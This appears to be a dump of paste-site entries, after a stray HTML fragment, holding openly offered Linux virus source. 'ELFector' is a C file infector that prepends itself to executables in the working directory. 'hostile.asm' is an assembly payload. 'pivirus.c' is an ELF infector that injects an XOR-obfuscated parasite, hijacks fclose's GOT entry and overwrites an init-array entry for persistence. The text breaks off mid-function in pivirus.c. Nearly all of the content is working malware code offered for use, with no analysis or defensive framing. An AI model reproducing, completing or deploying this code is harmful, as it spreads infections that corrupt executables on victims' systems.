    <link href=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"" rel=""stylesheet"" integrity=""sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM"" crossorigin=""anonymous"">
</head>
<body>

    <script src=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"" integrity=""sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz"" crossorigin=""anonymous""></script>  
</body>
</html>"
Fj2XhAUr,ELFector - A simple ELF file infector virus,FlyFar,C,Friday 7th of July 2023 08:48:45 PM CDT,"#include<stdio.h>
#include<stdlib.h>
#include<string.h>

int is_file_infected (char filename[])
{
	char output[400];
	char command [400];
	snprintf(command, sizeof command, ""%s%s%s"", ""strings "", filename, ""| grep virus > /tmp/virussearch046.txt"");
	char inf[] = ""virus"";
	FILE *finf;
	system(&command[0]);	
	finf = fopen(""/tmp/virussearch046.txt"", ""r"");
   	fgets(output,399,finf);
    return (strstr(output,inf) != NULL);
}

int is_file_elf(char filename[])
{
    char command[200];
	snprintf(command, sizeof command, ""%s%s%s"", ""file "", filename, "" > /tmp/elfsearch046.txt"");
    char elf[] = ""ELF"";
    char output[200];
    FILE *file;
	system(&command[0]);
    file = fopen(""/tmp/elfsearch046.txt"", ""r"");
    fgets(output,199,file);
    return (strstr(output,elf) != NULL);
}

int main(int argc, char* argv[])
{
    FILE *fp;
	FILE *virus_file,*target_file,*current_file;
	char command[500];
	char filename[100];
   
	system(""ls > /tmp/contents046.txt"");
    fp = fopen(""/tmp/contents046.txt"", ""r"");
    while (!feof(fp))
    {
		fgets(filename,300,fp);
		filename[strlen(filename)-1]='\0';
        if(is_file_elf(filename))
		{
		   if (is_file_infected(filename) == 0)
			{
				snprintf(command, sizeof command, ""%s%s%s%s%s%s"", ""cat virus "", filename, "" > /tmp/infect046.tmp;mv /tmp/infect046.tmp "", filename, "";chmod 777 "", filename);
				system(&command[0]);
				break;
			}
			
		}
	}
	if(strcmp(argv[0],""virus"") == 0 || strcmp(argv[0] , ""./virus"") == 0)
	{
		char delete_command[] = ""find /tmp -name '*046*' -delete"";
		system(&delete_command[0]);
		exit(0);		
	}
	else
	{
		char ch;int i;
		virus_file = fopen(""virus"", ""r"");
		fseek(virus_file,0,SEEK_END);
		int end = ftell(virus_file);
		fclose(virus_file);
	   	current_file = fopen(argv[0],""r"");
		target_file = fopen(""/tmp/target046"",""w"");
		fseek(current_file, end, SEEK_SET);
		while (!feof(current_file))
		{
			ch = fgetc(current_file);
			fputc(ch, target_file);
		}
		fclose(current_file);
		fclose(target_file);
		system(""chmod 777 /tmp/target046"");
		if(argc==1)	
		{
			system(""/tmp/target046"");
		}
		else
		{
			char original_functionality[200] = ""/tmp/target046 "";
			for (i=2; i<=argc; i++)
			{	
				if(i == argc)
					strcat(original_functionality, argv[i-1]);
				else
					{
						strcat(original_functionality, argv[i-1]);
						strcat(original_functionality, "" "");
					}
			}
			system(&original_functionality[0]);			
		}	
	}
	printf(""My name is ELFector and thank you for running me!\n"");
	char delete_command[] = ""find /tmp -name '*046*' -delete"";
	system(&delete_command[0]);
    return 0;
}
"
dAGfujTF,hostile.asm,FlyFar,ASM (NASM),Friday 7th of July 2023 08:41:52 PM CDT,"%define ZERO_ARGS           0x0
%define WRITE_SYSCALL_NUM   0x1
%define STDOUT_FILENO       0x1
%define BUF_LEN             0x1
%define LOOP_COUNTER        0x8000
%define RANDOM_NUM          0x100

%macro do_write_syscall ZERO_ARGS 
    mov rdi, STDOUT_FILENO
    mov rdx, BUF_LEN
    mov rax, WRITE_SYSCALL_NUM
    syscall   
%endmacro

%macro func_ret ZERO_ARGS
    xor rax, rax
    ret
%endmacro

%macro save_regs ZERO_ARGS
    push rbx
    push rdx
    push rcx
    push rdi
    push rsi
    push r8
    push r9
    push r10
%endmacro

%macro restore_regs ZERO_ARGS
    pop r10
    pop r9
    pop r8
    pop rsi
    pop rdi
    pop rcx
    pop rdx
    pop rbx
%endmacro

%macro clear_regs ZERO_ARGS
    xor rax,rax
    xor rbx,rbx
    xor rcx,rcx
    xor rdx,rdx
    xor rdi,rdi
    xor rsi,rsi
    xor r8,r8
    xor r9,r9
    xor r10,r10
%endmacro
    
    
section .text

global pi_hostile_fclose, pi_get_hostile_len


pi_hostile_fclose:


    save_regs
    clear_regs
    
    push RANDOM_NUM

    lea rsi, [ rsp ]    
 
    mov rcx, LOOP_COUNTER

loop_start:
    
    inc byte [ rsi ] 
    
    push rcx
    
    do_write_syscall
    
    pop rcx
    
    loop loop_start

loop_end:

    pop rax
    restore_regs
    func_ret


pi_hostile_fclose_end:


pi_get_hostile_len:
    
    mov  rax, pi_hostile_fclose_end - pi_hostile_fclose
    ret"
vKdqxNaZ,pivirus.c,FlyFar,C,Friday 7th of July 2023 08:40:57 PM CDT,"#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <error.h>
#include <dirent.h>
#include <elf.h>


#define _4KB_PAGE           0x1000
#define _4KB_OFFSET_MASK    0xfff
#define PAGE_SIZE           _4KB_PAGE
#define PAGE_OFFSET_MASK    _4KB_OFFSET_MASK

#define PAGE_ALIGN_LOW(vaddr)    ((vaddr) & ~PAGE_OFFSET_MASK)
#define PAGE_ALIGN_HIGH(vaddr)   (PAGE_ALIGN_LOW(vaddr) + PAGE_SIZE)
#define VADDR_OFFSET(vaddr)      ((vaddr) & PAGE_OFFSET_MASK)


#define PI_MM_ALLOCATED     0x1
#define PI_MM_FREE          0x0
#define PI_MM_POOL_SZ       0x8000
#define PI_POISON_PTR       0x0

#define STRING_EQUAL        0x0
#define STRING_NOT_EQUAL    !STRING_EQUAL

#define MEM_EQUAL           0x0
#define MEM_NOT_EQUAL       !MEM_EQUAL

#define DIRENTS_BUF_SIZE    0x8000


#define PARASITE_ENTRY_SIZE 0x1b
#define PARASITE_OFFSET_1   0x1f
#define PARASITE_OFFSET_2   0x26
#define PARASITE_OFFSET_3   0x2b
#define PARASITE_OFFSET_4   0x50
#define PARASITE_OFFSET_5   0x54
#define PARASITE_LEN        0x60

#define PI_XOR_KEY          0x78

#define PI_OPERATION_SUCCESS  0
#define PI_OPERATION_ERROR   -1

#define PI_SIGNATURE 0x10

#define inline_function __attribute__((always_inline)) inline


#define pi_check_syscall_fault(x)  \
    if ((int64_t)x < 0)            \
        return PI_OPERATION_ERROR  \

/*
 * macro functions to avoid code repeating
*/
#define pi_define_syscall_1(syscall_name,syscall_num,type1,arg1)  \
    int64_t pi_##syscall_name(type1 arg1)                         \
    {                                                             \
        int64_t __ret;                                            \
                                                                  \
        __asm__ volatile                                          \
            (                                                     \
             ""movq  %0,%%rdi                    \n""               \
             ""movq  $""#syscall_num"",%%rax       \n""               \
             ""syscall                           \n""               \
             :                                                    \
             : ""g"" (arg1)                                         \
            );                                                    \
                                                                  \
        __asm__                                                   \
            (                                                     \
             ""movq  %%rax,%0""                                     \
             : ""=g"" (__ret)                                       \
            );                                                    \
                                                                  \
        return __ret;                                             \
    }

#define pi_define_syscall_2(syscall_name,syscall_num,type1,arg1,type2,arg2) \
    int64_t pi_##syscall_name(type1 arg1,type2 arg2)                        \
    {                                                                       \
        int64_t __ret;                                                      \
                                                                            \
        __asm__ volatile                                                    \
            (                                                               \
             ""movq  %0,%%rdi                    \n""                         \
             ""movq  %1,%%rsi                    \n""                         \
             ""movq  $""#syscall_num"",%%rax       \n""                         \
             ""syscall""                                                      \
             :                                                              \
             : ""g"" (arg1), ""g"" (arg2)                                       \
            );                                                              \
                                                                            \
        __asm__                                                             \
            (                                                               \
             ""movq  %%rax,%0""                                               \
             : ""=g"" (__ret)                                                 \
            );                                                              \
                                                                            \
        return __ret;                                                       \
    }

#define pi_define_syscall_3(syscall_name,syscall_num,type1,arg1,type2,arg2,type3,arg3)  \
    int64_t pi_##syscall_name(type1 arg1,type2 arg2,type3 arg3)                         \
    {                                                                                   \
        int64_t __ret;                                                                  \
                                                                                        \
        __asm__ volatile                                                                \
            (                                                                           \
             ""movq  %0,%%rdi                    \n""                                     \
             ""movq  %1,%%rsi                    \n""                                     \
             ""movq  %2,%%rdx                    \n""                                     \
             ""movq  $""#syscall_num"",%%rax       \n""                                     \
             ""syscall""                                                                  \
             :                                                                          \
             : ""g"" (arg1), ""g"" (arg2), ""g"" (arg3)                                       \
            );                                                                          \
                                                                                        \
        __asm__                                                                         \
            (                                                                           \
             ""movq  %%rax,%0""                                                           \
             : ""=g"" (__ret)                                                             \
            );                                                                          \
                                                                                        \
        return __ret;                                                                   \
    }



char fclose_xor_encoded[] = ""\x1e\x1b\x14\x17\x0b\x1d"";


char parasite[] = 
    ""\x50\x53\x57\x56\x52\x51\x55""
    ""\x48\x31\xc0""
    ""\x48\x31\xdb""
    ""\x48\x31\xd2""
    ""\x48\x31\xc9""
    ""\x48\x31\xed""
    ""\xe8\x41\x00\x00\x00""
    ""\x5f""
    ""\x48\x81\xef\x41\x41\x41\x41"" 
    ""\x48\x81\xc7\x43\x43\x43\x43""
    ""\xbe\x42\x42\x42\x42""
    ""\xba\x01\x00\x00\x00""
    ""\x48\x83\xca\x02""
    ""\x48\x83\xca\x04""
    ""\xb8\x0a\x00\x00\x00""
    ""\x0f\x05""
    ""\xe8\x16\x00\x00\x00""
    ""\x58""
    ""\x48\x83\xc0\x18""
    ""\x48\x89\x05\x0c\x00\x00\x00""
    ""\x5d\x59\x5a\x5e\x5f\x5b\x58\xc3""
    ""\xeb\xbd""
    ""\xeb\xe8"";


typedef struct start_args
{
#define DUMMY_SIZE 8 //force arguments to be on stack 
    char *argv[DUMMY_SIZE]; 
}start_args_t;

typedef struct malloc_header
{
    uint32_t stat;
    uint32_t size;
    struct malloc_header *next;
}malloc_header_t;


typedef struct mman
{
    uint8_t *mm_pool_start;
    uint8_t *mm_pool_end;
    uint8_t *mm_cur_brk;
    malloc_header_t *malloc_head;
}mman_t;

typedef struct linux_dirent64
{
    uint64_t d_ino;
    uint64_t d_off;
    uint16_t d_reclen;
    uint8_t  d_type;
    char     d_name[];
}linux_dirent64_t;

typedef struct targetfunc
{
    uint64_t func_got;
    uint64_t func_name_len;
    uint8_t  *func_name;
}targetfunc_t;

typedef struct hostilefunc
{
    uint64_t hostile_addr;
    uint64_t hostile_len;
}hostilefunc_t;


typedef struct elfstructs
{
    Elf64_Ehdr      *ehdr;
    Elf64_Phdr      *phdr;
    Elf64_Phdr      *textphdr;
    Elf64_Shdr      *shdr;
    Elf64_Sym       *dyn_symtab;
    Elf64_Dyn       *dynseg;
    Elf64_Rela      *rela;
    Elf64_Addr      *pltgot;
    Elf64_Rela      *pltrela;
    Elf64_Xword     relasz;
    Elf64_Xword     pltrelsz;
    Elf64_Addr      *initarray;
    Elf64_Addr      gnureloc_start;
    Elf64_Xword     gnureloc_sz;
    uint8_t         *dyn_strtab;
}elfstructs_t;


typedef struct loadsegments
{
    Elf64_Addr      code_vaddr;
    Elf64_Addr      data_vaddr;
    Elf64_Off       code_offset;
    Elf64_Off       data_offset;
    Elf64_Xword     code_size;
    Elf64_Xword     data_size;
}loadsegments_t;


typedef struct elf_flags
{
    uint64_t    bind_now;
}elf_flags_t;


typedef struct target_elf
{
    const char      *name;
    uint8_t         *mmap;
    int64_t         fd;
    uint64_t        filehole;
    elfstructs_t    elfstructs;
    loadsegments_t  loadsegments;
    hostilefunc_t   hostilefunc;
    targetfunc_t    targetfunc;
    elf_flags_t     elf_flags;
    struct stat     stat;
}target_elf_t;



target_elf_t *target_elf;
mman_t mman;



extern uint64_t pi_hostile_fclose(void);
extern uint64_t pi_get_hostile_len(void);


pi_define_syscall_1(close,3,int64_t,fd)

pi_define_syscall_1(chdir,80,const char *,path)

pi_define_syscall_1(exit,60,uint64_t,exit_stat);

pi_define_syscall_2(fstat,5,int64_t,fd,struct stat *,stat_struct)

pi_define_syscall_2(rename,82,const char *,old_name,const char *,new_name)
    
pi_define_syscall_2(chmod,90,const char *,filename,int64_t,mode)

pi_define_syscall_2(munmap,11,uint64_t,addr,uint64_t,size);

pi_define_syscall_3(open,2,const char *,path,int64_t,flags,int64_t,mode)

pi_define_syscall_3(read,0,int64_t,fd,void *,buf,uint64_t,count)

pi_define_syscall_3(write,1,int64_t,fd,const char *,buf,uint64_t,count)

pi_define_syscall_3(mprotect,10,void *,addr,uint64_t,len,int64_t,prot)

pi_define_syscall_3(getdents64,217,int64_t,fd,char *,buf,uint64_t,buf_sz)

pi_define_syscall_3(lseek,8,int64_t,fd,int64_t,offset,int64_t,whence)


void *pi_mmap(void *addr,uint64_t len,int64_t prot,int64_t flags,int64_t fd,int64_t offset)
{
    uint64_t __ret;

    __asm__ volatile 
        (
         ""movq $9,%%rax             \n""
         ""movq %0,%%rdi             \n""
         ""movq %1,%%rsi             \n""
         ""movq %2,%%rdx             \n""
         ""movq %3,%%r10             \n""
         ""movq %4,%%r8              \n""
         ""movq %5,%%r9              \n""
         ""syscall""
         :
         : ""g"" (addr), ""g"" (len), ""g"" (prot), ""g"" (flags), ""g"" (fd), ""g"" (offset)
        );

    __asm__
        (
         ""movq  %%rax,%0""
         : ""=g"" (__ret)
        );

    return (void *)(__ret);

}




inline_function void pi_strcpy(char *dest,const char *src)
{
    while (*src) *dest++ = *src++;
    *dest = *src;
}


inline_function uint64_t pi_strlen(const char *str)
{
    uint64_t len = 0;
    
    while (*str++) ++len;
    
    return len;
}

inline_function void pi_memcpy(void *dest,void *src,uint64_t len)
{
    while(len--) *((uint8_t *)dest++) = *((uint8_t *)src++);
}

inline_function int64_t pi_memcmp(void *mem1,void *mem2,uint64_t len)
{
    while (len--)
    {
        if (*((uint8_t *)mem1++) != *((uint8_t *)mem2++))
            return MEM_NOT_EQUAL;
    }

    return MEM_EQUAL;
}

inline_function void pi_memset(void *mem,uint8_t val,uint64_t len)
{
    while (len--) *((uint8_t *)mem++) = val;
}

void pi_puts(const char *str)
{
    pi_write(STDOUT_FILENO,str,pi_strlen(str));
}

/*
 * gets a memory pool that will be used by pi_malloc 
*/
int64_t pi_mm_getpool(void)
{
    mman.mm_pool_start = pi_mmap(NULL,PI_MM_POOL_SZ,PROT_WRITE | PROT_READ,MAP_ANONYMOUS | MAP_PRIVATE,-1,0);
    pi_check_syscall_fault(mman.mm_pool_start);

    mman.mm_pool_end = mman.mm_pool_start + PI_MM_POOL_SZ;

    mman.mm_cur_brk = mman.mm_pool_start;

    return PI_OPERATION_SUCCESS;
}

void *pi_sbrk(uint32_t size)
{
    void *tmp;

    tmp = (void *)mman.mm_cur_brk;

    mman.mm_cur_brk += size;

    if (mman.mm_cur_brk > mman.mm_pool_end)
        return NULL;
    
    return tmp;
}

void *pi_malloc(uint32_t size)
{
    malloc_header_t *tmp1, *tmp2, *tmp3, *tmp4;

    if (!mman.malloc_head)
    {
        mman.malloc_head = pi_sbrk(size + sizeof(malloc_header_t));

        if (mman.malloc_head == PI_POISON_PTR)
            return (void *)PI_POISON_PTR;

        mman.malloc_head->stat = PI_MM_ALLOCATED;
        mman.malloc_head->size = size;
        mman.malloc_head->next = PI_POISON_PTR;


        return (void *)(mman.malloc_head + 1);
    }

    //search for free block with bsize >= size
    tmp1 = mman.malloc_head;
    while (tmp1)
    {
        if ((tmp1->stat == PI_MM_FREE) && (tmp1->size >= size))
        {
            if (tmp1->size > size)
            {
                //divide the block
                tmp3       = (malloc_header_t *)( (uint8_t *)( tmp1 + 1) + size );
                tmp3->stat = PI_MM_ALLOCATED;
                tmp3->size = tmp1->size - size;
                tmp3->next = tmp1->next;
                tmp1->next = tmp3;
                goto __ret;
            }
            tmp1->stat = PI_MM_ALLOCATED;
__ret:
            return (void *)(tmp1 + 1);
        }
        tmp4 = tmp1;
        tmp1 = tmp1->next;
    }

    tmp2 = pi_sbrk(size + sizeof(malloc_header_t));

    if (tmp2 == PI_POISON_PTR)
        return (void *)PI_POISON_PTR;

    tmp2->size = size;
    tmp2->stat = PI_MM_ALLOCATED;
    tmp2->next = PI_POISON_PTR;

    tmp4->next = tmp2;

    pi_memset(tmp2 + 1,0x0,tmp2->size);

    return (void *)(tmp2 + 1);
}

/*
 * a simple free that just frees the block at the given address
 * there is no adjacent free blocks coalescing
*/ 
void pi_free(void *ptr)
{
    malloc_header_t *tmp1;

    tmp1 = (malloc_header_t *)ptr - 1;
    tmp1->stat = PI_MM_FREE;

    pi_memset(tmp1 + 1,0x0,tmp1->size);
}


inline_function void pi_xor_mem(void *mem,uint64_t len,uint8_t xor_key)
{
    while (len--) *((uint8_t *)mem++) ^= xor_key;
}



int64_t pi_check_target(void)
{
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    char elfmag[] = ELFMAG;
    uint64_t dyn_linked = 0;


    target_elf->fd = pi_open(target_elf->name,O_RDWR,0);
    pi_check_syscall_fault(target_elf->fd);

    pi_check_syscall_fault(pi_fstat(target_elf->fd,&target_elf->stat));

    target_elf->mmap = pi_mmap(NULL,
                               target_elf->stat.st_size,
                               PROT_READ | PROT_WRITE,
                               MAP_SHARED,
                               target_elf->fd,
                               0);
    pi_check_syscall_fault(target_elf->mmap);

    ehdr = (Elf64_Ehdr *)target_elf->mmap;
    phdr = (Elf64_Phdr *)(target_elf->mmap + ehdr->e_phoff);

    if (pi_memcmp(target_elf->mmap,elfmag,SELFMAG) == MEM_NOT_EQUAL)
        return PI_OPERATION_ERROR;
    
    //binary is infected before ? 
    if (ehdr->e_ident[EI_OSABI] == PI_SIGNATURE)
        return PI_OPERATION_ERROR;
    
    if (!((ehdr->e_type == ET_EXEC) || (ehdr->e_type == ET_DYN)))
        return PI_OPERATION_ERROR;
    
    for (uint64_t i = 0; i < ehdr->e_phnum; ++i,++phdr)
    {
        if (phdr->p_type != PT_DYNAMIC)
            continue;
        dyn_linked = 1;
    }

    if (!dyn_linked)
        return PI_OPERATION_ERROR;
    
    return PI_OPERATION_SUCCESS;
}


void pi_do_init(void)
{
    Elf64_Phdr  *tmp_phdr;
    Elf64_Shdr  *tmp_shdr;
    Elf64_Dyn   *tmp_dynseg;
    Elf64_Sym   *tmp_dynsym;
    Elf64_Addr  target_code_vaddr, target_data_vaddr;
    Elf64_Off   target_code_offset, target_data_offset;

    target_elf->elfstructs.ehdr = (Elf64_Ehdr *)target_elf->mmap;
    target_elf->elfstructs.phdr = (Elf64_Phdr *)(target_elf->mmap + target_elf->elfstructs.ehdr->e_phoff);
    target_elf->elfstructs.shdr = (Elf64_Shdr *)(target_elf->mmap + target_elf->elfstructs.ehdr->e_shoff);


    tmp_phdr = target_elf->elfstructs.phdr;
    for (Elf64_Half i = 0; i < target_elf->elfstructs.ehdr->e_phnum; ++i, ++tmp_phdr)
    {
        switch (tmp_phdr->p_type)
        {
            case PT_LOAD:
                if (tmp_phdr->p_flags & PF_X)
                {
                    target_elf->loadsegments.code_vaddr   = tmp_phdr->p_vaddr;
                    target_elf->loadsegments.code_offset  = tmp_phdr->p_offset;
                    target_elf->loadsegments.code_size    = tmp_phdr->p_memsz;
                    target_elf->elfstructs.textphdr       = tmp_phdr;
                
                    target_code_vaddr  = target_elf->loadsegments.code_vaddr;
                    target_code_offset = target_elf->loadsegments.code_offset;
                
                }
                target_elf->loadsegments.data_vaddr  = tmp_phdr->p_vaddr;
                target_elf->loadsegments.data_offset = tmp_phdr->p_offset;

                target_data_vaddr  = target_elf->loadsegments.data_vaddr;
                target_data_offset = target_elf->loadsegments.data_offset;
                break;

            case PT_DYNAMIC:
                target_elf->elfstructs.dynseg = (Elf64_Dyn *)(target_elf->mmap + tmp_phdr->p_offset);
                break;
            
            case PT_GNU_RELRO:
                target_elf->elfstructs.gnureloc_sz    = tmp_phdr->p_memsz;
                target_elf->elfstructs.gnureloc_start = tmp_phdr->p_vaddr - target_elf->elfstructs.textphdr->p_vaddr;
                break;
        }
    }

    tmp_dynseg = target_elf->elfstructs.dynseg;
    for (; tmp_dynseg->d_tag != DT_NULL; ++tmp_dynseg)
    {
        switch (tmp_dynseg->d_tag)
        {
            case DT_SYMTAB:
                target_elf->elfstructs.dyn_symtab = (Elf64_Sym *)(target_elf->mmap + target_code_offset +
                                                                     (tmp_dynseg->d_un.d_ptr - target_code_vaddr));
                break;

            case DT_STRTAB:
                target_elf->elfstructs.dyn_strtab = target_elf->mmap + target_code_offset +
                                                                    (tmp_dynseg->d_un.d_ptr - target_code_vaddr);
                break;

            case DT_JMPREL:
                target_elf->elfstructs.pltrela = (Elf64_Rela *)(target_elf->mmap + target_code_offset +
                                                                    (tmp_dynseg->d_un.d_ptr - target_code_vaddr));
                break;

            case DT_PLTGOT:
                target_elf->elfstructs.pltgot = (Elf64_Addr *)(target_elf->mmap + target_data_offset + 
                                                                    (tmp_dynseg->d_un.d_ptr - target_data_vaddr));
            case DT_RELA:
                target_elf->elfstructs.rela = (Elf64_Rela *)(target_elf->mmap + target_code_offset + 
                                                                    (tmp_dynseg->d_un.d_ptr - target_code_vaddr));
                break;

            case DT_RELASZ:
                target_elf->elfstructs.relasz = tmp_dynseg->d_un.d_val;
                break;

            case DT_PLTRELSZ:
                target_elf->elfstructs.pltrelsz = tmp_dynseg->d_un.d_val;
                break;

            case DT_FLAGS_1:
                if (tmp_dynseg->d_un.d_val & DF_1_NOW)
                    ++target_elf->elf_flags.bind_now;
                break;

            case DT_INIT_ARRAY:
                target_elf->elfstructs.initarray = (Elf64_Addr *)(target_elf->mmap + (tmp_dynseg->d_un.d_ptr -
                                                                                           target_data_vaddr + target_data_offset));
                break;
        }
    }

    target_elf->hostilefunc.hostile_addr = (uint64_t)pi_hostile_fclose;
    target_elf->hostilefunc.hostile_len  = pi_get_hostile_len();

}


int32_t pi_symbol_lookup(void)
{
    char *dynstrtab;
    char *sym_name;
    Elf64_Rela  *rel;
    Elf64_Xword relsz;
    Elf64_Sym   *dynsymtab;
        

    if (target_elf->elf_flags.bind_now && !target_elf->elfstructs.pltrela)
    {
        rel     = target_elf->elfstructs.rela;
        relsz   = target_elf->elfstructs.relasz;

    }else
    {
        rel     = target_elf->elfstructs.pltrela;
        relsz   = target_elf->elfstructs.pltrelsz;
    }


    dynsymtab = target_elf->elfstructs.dyn_symtab;
    dynstrtab = target_elf->elfstructs.dyn_strtab;

    target_elf->targetfunc.func_name_len = pi_strlen(fclose_xor_encoded);
    target_elf->targetfunc.func_name     = pi_malloc(target_elf->targetfunc.func_name_len);

    pi_memcpy(target_elf->targetfunc.func_name,
              fclose_xor_encoded,
              target_elf->targetfunc.func_name_len);

    pi_xor_mem(target_elf->targetfunc.func_name,
               target_elf->targetfunc.func_name_len,
               PI_XOR_KEY);

    
    for (Elf64_Xword i = 0; i < (relsz / sizeof(Elf64_Rela)); ++i, ++rel)
    {
        sym_name = &dynstrtab[dynsymtab[ELF64_R_SYM(rel->r_info)].st_name];
        if (pi_memcmp(sym_name,target_elf->targetfunc.func_name,target_elf->targetfunc.func_name_len) == MEM_EQUAL)
                target_elf->targetfunc.func_got = (Elf64_Addr)rel->r_offset;
    }

    pi_free(target_elf->targetfunc.func_name);

    if (!target_elf->targetfunc.func_got)
        return PI_OPERATION_ERROR;

    return PI_OPERATION_SUCCESS;
}



/*
 * flcose's GOT entry hijacking is done @ runtime with the following algorithm:
 *      - let r be any register
 *      - (r) holds hostile function address
 *      - [ fclose_got_entry_offset + rip ]  <- r , let this instruction's address be #modify_got
 *      - [ addr ] is the address of the next instruction that modifies the GOT entry (the next to [#modify_got])
 *      - [ diff ] is the offset between the target GOT entry and [ addr ]
 *
 *      - so it will be like this
 *         - mov $address_of_hostile, diff(%rip) 
 *
 * the parasite takes care of ELF binaries that have the BIND_NOW flag so the entry of the parasite
 * mprotects the GNU_RELRO PAGES to be writeable  
*/

void pi_edit_parasite(void)
{
    uint64_t diff, addr, var1, var2, var3;

    var1 = target_elf->loadsegments.code_size + PARASITE_ENTRY_SIZE;

    var2 = PAGE_ALIGN_LOW(target_elf->elfstructs.gnureloc_start);

    var3 = target_elf->elfstructs.gnureloc_sz;

    addr = target_elf->loadsegments.code_vaddr + 
                        target_elf->loadsegments.code_size + 
                                                    PARASITE_OFFSET_5;

    diff = target_elf->targetfunc.func_got - addr;

    *((uint32_t *)&parasite[PARASITE_OFFSET_1]) = (uint32_t)var1;
    *((uint32_t *)&parasite[PARASITE_OFFSET_2]) = (uint32_t)var2;
    *((uint32_t *)&parasite[PARASITE_OFFSET_3]) = (uint32_t)var3;
    *((uint32_t *)&parasite[PARASITE_OFFSET_4]) = (uint32_t)diff;
}

int64_t pi_create_infected_clone(void)
{
    char     tmpfile[] = ""/tmp/.tmp.PI314X_OC"";
    char     buf[PAGE_SIZE];
    int64_t  tmpfile_fd, syscall_ret;
    int64_t  infected_clone_mode, tmpfile_mode;
    uint64_t buf1_sz, buf2_sz, buf3_sz;
    
    //mark binary as infected
    target_elf->elfstructs.ehdr->e_ident[EI_OSABI] = PI_SIGNATURE;

    tmpfile_mode        = S_IRUSR | S_IWUSR;
    infected_clone_mode = tmpfile_mode | S_IXUSR;
    
    tmpfile_fd = pi_open(tmpfile,O_CREAT | O_RDWR,tmpfile_mode);
    pi_check_syscall_fault(tmpfile_fd);

    buf1_sz = target_elf->loadsegments.code_offset + 
                        target_elf->loadsegments.code_size + 
                                target_elf->filehole;
    
    buf2_sz = ( PARASITE_LEN + target_elf->hostilefunc.hostile_len ) > target_elf->filehole ? PAGE_SIZE : 0;
    
    buf3_sz = target_elf->stat.st_size - buf1_sz;

    syscall_ret = pi_write(tmpfile_fd,target_elf->mmap,buf1_sz);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_write(tmpfile_fd,buf,buf2_sz);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_write(tmpfile_fd,target_elf->mmap + buf1_sz,buf3_sz);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_lseek(tmpfile_fd,
                           target_elf->loadsegments.code_offset + 
                           target_elf->loadsegments.code_size,
                           SEEK_SET);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_write(tmpfile_fd,parasite,PARASITE_LEN);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_write(tmpfile_fd,
                          (const char *)target_elf->hostilefunc.hostile_addr,
                          target_elf->hostilefunc.hostile_len);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_close(tmpfile_fd);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_chmod(tmpfile,infected_clone_mode);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_rename(tmpfile,target_elf->name);
    pi_check_syscall_fault(syscall_ret);

    return PI_OPERATION_SUCCESS;
}

void pi_infect_target(void)
{
    Elf64_Phdr  *elfphdr;
    Elf64_Shdr  *elfshdr;
    Elf64_Rela  *elfrela;
    Elf64_Addr  target_code_vaddr, target_data_vaddr;
    Elf64_Off   target_code_offset, target_data_offset;
    Elf64_Xword target_code_size, target_data_size;
    uint64_t    flag, parasite_len, off, addr;
    uint8_t old_osabi;

    if (pi_check_target() == PI_OPERATION_ERROR)
        goto target_cleanup;

    pi_do_init();

    if (pi_symbol_lookup() == PI_OPERATION_ERROR)
        goto target_cleanup;


    elfphdr = target_elf->elfstructs.phdr;
    elfshdr = target_elf->elfstructs.shdr;
    elfrela = target_elf->elfstructs.rela;

    target_code_vaddr  = target_elf->loadsegments.code_vaddr;
    target_data_vaddr  = target_elf->loadsegments.data_vaddr;

    target_code_offset = target_elf->loadsegments.code_offset;
    target_data_offset = target_elf->loadsegments.data_offset;

    target_code_size   = target_elf->loadsegments.code_size;
    target_data_size   = target_elf->loadsegments.data_size;

    flag         = 1;
    parasite_len = PARASITE_LEN;

    if ((parasite_len  + target_elf->hostilefunc.hostile_len) > 
             (PAGE_SIZE - VADDR_OFFSET(target_code_vaddr + target_code_size)))
        return;


    for (Elf64_Half i = 0; i < target_elf->elfstructs.ehdr->e_phnum; ++i, ++elfphdr)
    {
        if (elfphdr->p_offset > (target_code_offset + target_code_size))
        {
            if (flag)
            {
                target_elf->filehole = elfphdr->p_offset - (target_code_offset + target_code_size);
                --flag;
            }
            if ((parasite_len + target_elf->hostilefunc.hostile_len) > target_elf->filehole)
                elfphdr->p_offset += PAGE_SIZE;
        }
    }
    
    if (target_elf->elfstructs.shdr)
    {
        for (Elf64_Half i = 0; i < target_elf->elfstructs.ehdr->e_shnum; ++i, ++elfshdr)
        {
            if ((elfshdr->sh_offset + elfshdr->sh_size) == (target_code_offset + target_code_size))
                elfshdr->sh_size += parasite_len;

            if (elfshdr->sh_offset > (target_code_offset + target_code_size))
            {
                if ((parasite_len + target_elf->hostilefunc.hostile_len) > target_elf->filehole)
                    elfshdr->sh_offset += PAGE_SIZE;
            }
        }
        if ((parasite_len + target_elf->hostilefunc.hostile_len) > target_elf->filehole)
            target_elf->elfstructs.ehdr->e_shoff += PAGE_SIZE;
    }

    /*
     * - pivirus doesn't alter the original entry point of the target , instead the entry in the init array section that
     *   corresponds to frame dummy function's address is overwritten with the address of the parasite's entry point
     * 
     * - for ET_DYN binaries there will be a relocation entry for every entry in the init array section with the r_addend member
     *   of the relocation entry holding the offset of the function in the binary, so the dynamic linker will add the loading
     *   address of the binary to r_addend value and modify the  init array section's entry @ r_offset
     */
    if (target_elf->elfstructs.ehdr->e_type == ET_DYN)
    {
        for (uint64_t i = 0; i < (target_elf->elfstructs.relasz / sizeof(Elf64_Rela)); ++i, ++elfrela)
        {
            if (ELF64_R_TYPE(elfrela->r_info) == R_X86_64_RELATIVE)
            {
                if (elfrela->r_addend == (Elf64_Sxword)(target_elf->elfstructs.initarray[0]))
